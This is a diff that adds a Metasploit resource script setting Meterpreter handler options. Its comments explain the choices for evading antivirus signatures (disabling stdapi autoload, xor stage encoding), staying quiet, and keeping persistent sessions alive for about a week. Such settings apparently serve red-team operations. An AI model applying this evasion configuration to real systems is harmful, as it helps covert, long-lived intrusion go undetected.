@@ -1,0 +1,34 @@
+#make persistant 
+set ExitOnSession false
+#factor in non lab latency 
+set WfsDelay 30
+#dont autoloadstdapi, this is super well signatured 
+set AutoLoadStdapi false
+#this is also very signatured
+set AutoSystemInfo false
+#increase to 120 from 30, 30 is very aggressive
+set AutoVerifySessionTimeout 120
+#we for sure need to encode the stage
+set EnableStageEncoding true
+#this just makes it very loud
+set PingbackRetries 0
+#jump up the comm timeout, leave it up to the user to discover the session has died, makes meter quieter
+set SessionCommunicationTimeout 3600
+#keep our session for a long time, we dont need it dying randomly
+set SessionExpirationTimeout 604801
+#attempt to call back for just under 30 minutes
+set SessionRetryTotal 1750
+#attempt to reconnect every 8.33 minutes, this will give you three chances to catch the callback again 
+set SessionRetryWait 500
+#x64/xor is a classic, works fine
+set StageEncoder x64/xor
+#if the encoder is bad we dont want it to proceed
+set StageEncodingFallback false
+#if the initial stager doesnt connect call back three times every 8.33 minutes
+set StagerRetryCount 3
+set StagerRetryWait 500
+#i would like to know everything you are doing
+set Verbose true
+<ruby>
+    puts "if this is http/https remember to set your ssl cert and LURI"
+</ruby>
